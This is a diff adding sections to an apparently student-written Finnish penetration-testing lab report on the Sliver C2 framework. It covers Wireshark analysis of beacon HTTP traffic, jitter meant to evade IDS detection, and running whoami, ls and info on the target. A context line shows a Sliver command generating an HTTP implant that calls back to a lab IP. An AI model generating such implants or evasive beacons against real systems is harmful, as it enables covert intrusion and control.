@@ -94,3 +94,46 @@ Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännety
 generate --http 192.168.18.129 --os linux --arch amd64 --save ./sliver_http.elf
 ```
 
+## D) Sniff Sliver!
+
+<img width="730" height="222" alt="wireshark loopback" src="https://github.com/user-attachments/assets/38f051bb-48d6-48cc-a7ab-d08a9b7ff60e" />
+<img width="814" height="712" alt="http filter on wireshark" src="https://github.com/user-attachments/assets/71e0a17b-ce6f-4137-911e-c93a3b64e8de" />
+<img width="757" height="647" alt="wireshaaark" src="https://github.com/user-attachments/assets/bb5d040f-ea7e-4ffd-81d0-97eededbea62" />
+
+Liikennettä analysoitiin Wiresharkilla. Koska hyökkäys tehtiin paikallisesti, analyysi kohdistettiin (`lo`) (Loopback) -rajapintaan.
+
+Analyysissa havaittiin, että Sliverin HTTP-liikenne poikkeaa merkittävästi Metasploitin suorasta TCP-yhteydestä. Liikenne koostuu säännöllisistä HTTP POST- ja GET-pyynnöistä, jotka on naamioitu näyttämään tavalliselta verkkoselailulta (esim. URI-päätteet kuten .php tai .js).
+
+## E) Sliverillä voit muuttaa yhteyden ominaisuuksia
+
+<img width="642" height="130" alt="sliver file on kali" src="https://github.com/user-attachments/assets/70ed0e7e-f54c-49cf-8b66-5ec33d83f88a" />
+
+Yksi C2-liikenteen kriittisimmistä ominaisuuksista on Jitter. Tehtävässä luotiin uusi Beacon, johon lisättiin satunnaiskerroin.
+
+<img width="756" height="648" alt="wireshark seconds" src="https://github.com/user-attachments/assets/07ed3a04-1afb-4b7c-b7e7-d6dc1809da8a" />
+
+<img width="426" height="365" alt="wireshark secondssss" src="https://github.com/user-attachments/assets/0ffd6a26-ef0b-4bae-b0a3-771b28d1e658" />
+
+
+Wireshark-aikaleimoista havaittiin, että yhteydenotot eivät tapahtuneet tasan 5 sekunnin välein. Esimerkiksi pakettien välinen aika vaihteli satunnaisesti (esim. 5.01s, 6.59s, 5.69s). Tämä satunnaisuus on suunniteltu hämäämään automaattisia IDS-järjestelmiä, jotka etsivät matemaattisen tarkkaa säännöllisyyttä verkkoliikenteestä.
+
+## F) Sliverillä voi tehdä monenlaista kohteessa
+
+<img width="641" height="187" alt="beacon command" src="https://github.com/user-attachments/assets/62089e17-d897-4d52-909e-67a9ac38288c" />
+
+<img width="593" height="98" alt="using the beacon" src="https://github.com/user-attachments/assets/19fe51a5-8374-45ca-acc1-4f43e09d00c5" />
+
+Viimeisessä vaiheessa otettiin yhteys aktiiviseen beaconiin ja suoritettiin komentoja kohteessa.
+
+<img width="357" height="81" alt="sliver whoami" src="https://github.com/user-attachments/assets/0fecbed5-a606-4ede-9211-557de7cb7867" />
+<img width="757" height="811" alt="sliver ls command" src="https://github.com/user-attachments/assets/923db8ba-f9b9-4deb-8941-d28cd9e54b41" />
+<img width="576" height="443" alt="sliver info" src="https://github.com/user-attachments/assets/49ebd8f0-d214-407d-bc58-becd48366415" />
+
+
+
+Suoritettiin komennot (`whoam`), (`ls`) sekä (`info`)
+
+
+## Lähteet
+
+- <a href="https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita">Tero Karvinen</a>
